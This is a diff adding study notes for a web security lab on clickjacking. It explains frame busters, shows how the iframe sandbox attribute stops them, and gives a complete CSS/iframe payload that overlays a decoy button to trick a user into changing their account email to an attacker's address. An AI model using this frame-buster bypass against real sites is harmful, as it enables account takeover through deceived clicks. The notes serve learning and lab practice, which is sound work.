@@ -75,4 +75,43 @@ this parameter fills the data into the email box. like any data passed to this p
 
 ## LAB-3
 
+to avoid this clickjacking the websites will try to block the framing on their website.
 
+### frame buster
+to do that they typically use a javascript block which is included in their website's javascript files.there are called ```frame busters```.
+
+```overriding the frame buster```.
+
+### sandbox
+
+```sandbox``` - attribute that sets xtra restrictions for the content in the iframe.
+
+for example,
+```<iframe src="https://www.example.com"  sandbox="allow-forms"></iframe>```
+
+sandbox typically blocks js of the example.com to run when we load the page and also blocks things such as submitting of forms, using apis etc.
+
+```sandbox="allow-forms"``` - allows the example.com to submit forms but the js will not run(to submit the update email form).
+
+**Note :**```sandbox blocks the js of the example.com to run that means it is blocking the frame buster that is typically written in the js.```
+
+**Payload**
+```
+<style>
+    iframe {
+        position:absolute;
+        width:1000px;
+        height: 1000px;
+        opacity:0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:460px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://0af500cd04b01a8680733a0800ec0027.web-security-academy.net/my-account?email=hacker111@attacker-website.com"  sandbox="allow-forms"></iframe>
+```
